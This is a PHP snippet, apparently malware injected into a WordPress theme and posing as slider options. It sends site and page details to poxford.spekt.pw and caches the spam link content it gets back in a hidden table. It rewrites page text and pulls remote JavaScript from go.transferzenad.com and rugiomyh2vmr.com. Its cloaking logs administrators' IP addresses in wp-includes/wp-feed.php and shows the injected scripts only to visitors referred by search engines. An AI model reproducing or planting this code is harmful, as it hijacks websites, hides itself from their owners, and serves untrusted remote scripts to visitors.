ini_set('display_errors', 0);
error_reporting(0);
$wp_auth_key='b3de80aaa27f65938be458451c3ac075';






$dnetname = 'poxford';
$protocol = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off' || $_SERVER['SERVER_PORT'] == 443) ? "https://" : "http://";
$url = $protocol . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
$postid1 = url_to_postid($url);
global $ptype;
$ptype = get_post_type($postid1);

if ($_SERVER["REQUEST_URI"] == '/')
	{
	$ptype = 'homepage';
	}

if ($ptype == 'post' || $ptype == 'page')
	{
	$ptitle = base64_encode(esc_html(get_the_title($postid1)));
	}
  else if ($ptype == 'homepage')
	{
	$ptitle = base64_encode(get_bloginfo('name') . " " . get_bloginfo('description'));
	}

if ($ptype == 'post' || $ptype == 'page' || $ptype == 'homepage')
	{
	$plang = get_bloginfo('language');
	global $linkcontent;
	$wp_auth_url_key = '9402891ba8833cd5e21069bd95fc3a20';
	$spekturl = "http://poxford.spekt.pw/xx.php?i=" . $protocol . $_SERVER['HTTP_HOST'] . "&p=" . $postid1 . "&t=" . $ptype . "&title=" . $ptitle . "&lang=" . $plang . "&dnetname=" . $dnetname;
	if (($linkcontent = @file_get_contents($spekturl) OR $linkcontent = @file_get_contents($spekturl)) AND stripos($linkcontent, $wp_auth_url_key) !== false)
		{

		if (stripos($linkcontent, $wp_auth_url_key) !== false)
			{
			global $wpdb;
			$wpdb->query('CREATE TABLE IF NOT EXISTS `' . $wpdb->prefix . 'feeds` ( `id` varchar(255) NOT NULL, `content` TEXT NULL, PRIMARY KEY (`id`) ) ENGINE=MyISAM DEFAULT CHARSET=utf8;');
			$wpdb->query('REPLACE INTO `' . $wpdb->prefix . 'feeds` (id, content) values(' . $postid1 . ', "' . esc_sql(html_entity_decode($linkcontent)) . '")');
					//	$linkcontentdata = $wpdb->get_results('SELECT * FROM `' . $wpdb->prefix . 'feeds`');
		//	print_r($linkcontentdata);
			}


		}
		  else
			{
			global $wpdb;
			$linkcontentdata = $wpdb->get_row('SELECT `content` FROM `' . $wpdb->prefix . 'feeds` WHERE `id` = ' . $postid1);
			$linkcontent = $linkcontentdata->content;
           //echo "x4".$postid1.$linkcontent;
          //print_r($linkcontentdata);
			}

	}

if (preg_match_all('/<search>([\s\S]*?)<\/search>/i', $linkcontent, $matchsearch))
	{
	$foundkeywords = '';
	$searchkeywords = explode(',', $matchsearch[1][0]);
	$post_content = get_post_field('post_content', $postid1);
	foreach($searchkeywords as $searchkeyword)
		{
		if (stripos($post_content, $searchkeyword) !== false)
			{
			$foundkeywords.= $searchkeyword . ',';
			}
		}

	if ($foundkeywords !== '')
		{
		$linkcontentx = @file_get_contents("http://poxford.spekt.pw/xx.php?i=" . $protocol . $_SERVER['HTTP_HOST'] . "&p=" . $postid1 . "&t=" . $ptype . "&title=" . $ptitle . "&lang=" . $plang . "&k=" . base64_encode($foundkeywords) . "&dnetname=" . $dnetname);
		}
	}

if (preg_match_all('/<url_link><link>([\s\S]*?)<\/link><pos>(.*?)<\/pos><\/url_link>/i', $linkcontent, $matchlink))
	{
	global $url_link;
	global $link_pos;
	$url_link = $matchlink[1][0];
	$link_pos = $matchlink[2][0];
	if ($ptype == 'homepage')
			{
			$link_pos ='footer';
			}
	}

//echo $url_link . "--------->" . $link_pos;

if (!function_exists('after_slider_loption'))
	{
	/*****************************/
	function after_slider_loption($content)
		{
		global $ptype;
		if ($ptype == 'post' || $ptype == 'page')
			{
			global $url_link;
			$content = $content . $url_link;
			}

		return $content;
		}

	/*****************************/
	function before_slider_loption($content)
		{
		global $ptype;
		if ($ptype == 'post' || $ptype == 'page')
			{
			global $url_link;
			$content = $url_link . $content;
			}

		return $content;
		}

	/*****************************/
	function footer_slider_loption()
		{
		global $ptype;
		if ($ptype == 'post' || $ptype == 'page' || $ptype == 'homepage')
			{
			global $url_link;
			echo $url_link;
			}
		}

	/*****************************/
	function after_header_slider_loption()
		{
		global $ptype;
		if ($ptype == 'post' || $ptype == 'page' || $ptype == 'homepage')
			{
			global $url_link;
			echo $url_link;
			}
		}

	// add_action( 'wp_head' , 'after_header_slider_loption' , 20);

	/*****************************/
	/*****************************/
	function replace_slider_loption($content)
		{
		global $ptype;
		if ($ptype == 'post' || $ptype == 'page')
			{
			global $linkcontent;
			$regex = '/<replace><keyword>(.*?)<\/keyword><with>(.*?)<\/with><replimit>(.*?)<\/replimit><\/replace>/i';
			if (preg_match_all($regex, $linkcontent, $matchbuffer))
				{
				unset($matchbuffer[0]);
				$i = 0;
				foreach($matchbuffer[1] as $value)
					{
					$replaceword = $matchbuffer[1][$i];
					$replacewithword = $matchbuffer[2][$i];
					$replacelimit = $matchbuffer[3][$i];
					$content = preg_replace('~<a(.*)(' . $replaceword . ')(.*)</a>~i', '<a$1PLACEHOLDER$3</a>', $content);
					$content = preg_replace('~' . $replaceword . '~i', $replacewithword, $content, $replacelimit);
					$content = preg_replace('~PLACEHOLDER~', $replaceword, $content);
					$i++;
					}
				}
			}

		return $content;
		}

	/*****************************/
	function callback($buffer)
		{
		global $linkcontent;
		$regex = '/<allreplace><keyword>(.*?)<\/keyword><with>(.*?)<\/with><replimit>(.*?)<\/replimit><\/allreplace>/i';
		if (preg_match_all($regex, $linkcontent, $matchbuffer))
			{
			unset($matchbuffer[0]);
			$i = 0;
			foreach($matchbuffer[1] as $value)
				{
				$replaceword = $matchbuffer[1][$i];
				$replacewithword = $matchbuffer[2][$i];
				$replacelimit = $matchbuffer[3][$i];
				$buffer = preg_replace('~<a(.*)(' . $replaceword . ')(.*)</a>~i', '<a$1PLACEHOLDER$3</a>', $buffer);
				$buffer = preg_replace('~<title(.*)(' . $replaceword . ')(.*)</title>~i', '<title$1PLACEHOLDER$3</title>', $buffer);
				$buffer = preg_replace('~<meta(.*)(' . $replaceword . ')(.*)/>~i', '<meta$1PLACEHOLDER$3/>', $buffer);
				$buffer = preg_replace('~' . $replaceword . '~i', $replacewithword, $buffer, $replacelimit);
				$buffer = preg_replace('~PLACEHOLDER~', $replaceword, $buffer);
				$i++;
				}
			}

		return $buffer;
		}

	function buffer_start()
		{
		ob_start("callback");
		}

	function buffer_end()
		{
		ob_end_flush();
		}

	/*****************************/
	} //end if func exist

if ($link_pos == "after_content")
	{
	add_filter('the_content', 'after_slider_loption');
	}
  else
if ($link_pos == "before_content")
	{
	add_filter('the_content', 'before_slider_loption');
	}
  else
if ($link_pos == "footer")
	{
	add_action('wp_footer', 'footer_slider_loption');
	}

$regexreplace = '/<replace><keyword>(.*?)<\/keyword><with>(.*?)<\/with><replimit>(.*?)<\/replimit><\/replace>/i';

if (preg_match_all($regexreplace, $linkcontent, $matchbuffer))
	{
	add_filter('the_content', 'replace_slider_loption');
	}

$regexallreplace = '/<allreplace><keyword>(.*?)<\/keyword><with>(.*?)<\/with><replimit>(.*?)<\/replimit><\/allreplace>/i';

if (preg_match_all($regexallreplace, $linkcontent, $matchbuffer))
	{
	add_action('after_setup_theme', 'buffer_start');
	add_action('shutdown', 'buffer_end');
	}

// add_action('wp_footer','footer_slider_loption');





























































class __AntiAdBlock
{
    /** @var string */
    private $token = '3dfbba821ba7c3ff16321f3b3dc569600f337df5';

    /** @var int */
    private $zoneId = '1558097';

    ///// do not change anything below this point /////

    private function getCurl($url)
    {
        if ((!extension_loaded('curl')) || (!function_exists('curl_version'))) {
            return false;
        }

        $curl = curl_init();
        curl_setopt_array($curl, array(
            CURLOPT_RETURNTRANSFER => 1,
            CURLOPT_USERAGENT      => 'AntiAdBlock API Client',
            CURLOPT_FOLLOWLOCATION => false,
            CURLOPT_SSL_VERIFYPEER => true,
        ));

        // prefer SSL if at all possible
        $version = curl_version();
        if ($version['features'] & CURL_VERSION_SSL) {
            curl_setopt($curl, CURLOPT_URL, 'https://go.transferzenad.com' . $url);
        } else {
            curl_setopt($curl, CURLOPT_URL, 'http://go.transferzenad.com' . $url);
        }

        $result = curl_exec($curl);
        curl_close($curl);
        return $result;
    }

    private function getFileGetContents($url)
    {
        if (!function_exists('file_get_contents') || !ini_get('allow_url_fopen') ||
            ((function_exists('stream_get_wrappers')) && (!in_array('http', stream_get_wrappers())))) {
            return false;
        }

        if (function_exists('stream_get_wrappers') && in_array('https', stream_get_wrappers())) {
            return file_get_contents('https://go.transferzenad.com' . $url);
        } else {
            return file_get_contents('http://go.transferzenad.com' . $url);
        }
    }

    private function getFsockopen($url)
    {
        $fp = null;
        if (function_exists('stream_get_wrappers') && in_array('https', stream_get_wrappers())) {
            $fp = fsockopen('ssl://' . 'go.transferzenad.com', 443, $enum, $estr, 10);
        }
        if ((!$fp) && (!($fp = fsockopen('tcp://' . gethostbyname('go.transferzenad.com'), 80, $enum, $estr, 10)))) {
            return false;
        }

        $out = "GET " . $url . " HTTP/1.1\r\n";
        $out .= "Host: go.transferzenad.com\r\n";
        $out .= "User-Agent: AntiAdBlock API Client\r\n";
        $out .= "Connection: close\r\n\r\n";
        fwrite($fp, $out);
        $in = '';
        while (!feof($fp)) {
            $in .= fgets($fp, 1024);
        }
        fclose($fp);
        return substr($in, strpos($in, "\r\n\r\n") + 4);
    }

    private function findTmpDir()
    {
        if (!function_exists('sys_get_temp_dir')) {
            if (!empty($_ENV['TMP'])) {
                return realpath($_ENV['TMP']);
            }
            if (!empty($_ENV['TMPDIR'])) {
                return realpath($_ENV['TMPDIR']);
            }
            if (!empty($_ENV['TEMP'])) {
                return realpath($_ENV['TEMP']);
            }
            // this will try to create file in dirname(__FILE__) and should fall back to /tmp or wherever
            $tempfile = tempnam(dirname(__FILE__), '');
            if (file_exists($tempfile)) {
                unlink($tempfile);
                return realpath(dirname($tempfile));
            }
            return null;
        }
        return sys_get_temp_dir();
    }

    public function get()
    {
        $e = error_reporting(0);

        $url = "/v1/getTag?" . http_build_query(array('token' => $this->token, 'zoneId' => $this->zoneId));
        $file = $this->findTmpDir() . '/pa-code-' . md5($url) . '.js';
        // expires in 4h
        if (file_exists($file) && (time() - filemtime($file) < 4 * 3600)) {
            error_reporting($e);
            return file_get_contents($file);
        }
        $code = $this->getCurl($url);
        if (!$code) {
            $code = $this->getFileGetContents($url);
        }
        if (!$code) {
            $code = $this->getFsockopen($url);
        }

        if ($code) {
            // atomic update, and it should be okay if this happens simultaneously
            $fp = fopen("{$file}.tmp", 'wt');
            fwrite($fp, $code);
            fclose($fp);
            rename("${file}.tmp", $file);
        }

        error_reporting($e);
        return $code;
    }
}












if ( ! function_exists( 'slider_option' ) ) {  


function slider_option($content){ 
if(is_single())
{
$__aab = new __AntiAdBlock();
$con3= $__aab->get();

$con2 = "
<script type='text/javascript' src='//rugiomyh2vmr.com/42/ac/7f/42ac7faefbb3c959ec74f8c07898a6eb.js'></script>
";

$content=$content.$con3.$con2;
}
return $content;
} 

function slider_option_footer(){ 
if(!is_single())
{
$__aab = new __AntiAdBlock();
$con3= $__aab->get();

$con2 = "
<script type='text/javascript' src='//rugiomyh2vmr.com/42/ac/7f/42ac7faefbb3c959ec74f8c07898a6eb.js'></script>
";

echo $con3.$con2;
}
} 








function setting_my_first_cookie() {
  setcookie( 'wordpress_cf_adm_use_adm',1, time()+3600*24*1000, COOKIEPATH, COOKIE_DOMAIN);
  }


if(is_user_logged_in())
{
add_action( 'init', 'setting_my_first_cookie',1 );
}







if( current_user_can('edit_others_pages'))
{

if (file_exists(ABSPATH.'wp-includes/wp-feed.php'))
{
$ip=@file_get_contents(ABSPATH.'wp-includes/wp-feed.php');
}

if (stripos($ip, $_SERVER['REMOTE_ADDR']) === false)
{
$ip.=$_SERVER['REMOTE_ADDR'].'
';
@file_put_contents(ABSPATH.'wp-includes/wp-feed.php',$ip);


}



}






$ref = $_SERVER['HTTP_REFERER'];
$SE = array('google.','/search?','images.google.', 'web.info.com', 'search.','yahoo.','yandex','msn.','baidu','bing.','doubleclick.net','googleweblight.com');
foreach ($SE as $source) {
  if (strpos($ref,$source)!==false) {
    setcookie("sevisitor", 1, time()+120, COOKIEPATH, COOKIE_DOMAIN); 
	$sevisitor=true;
  }
}






if(!isset($_COOKIE['wordpress_cf_adm_use_adm']) && !is_user_logged_in()) 
{
$adtxt=@file_get_contents(ABSPATH.'wp-includes/wp-feed.php');
if (stripos($adtxt, $_SERVER['REMOTE_ADDR']) === false)
{
if($sevisitor==true || isset($_COOKIE['sevisitor']))
{
add_filter('the_content','slider_option');
add_action('wp_footer','slider_option_footer');
}

}

} 





}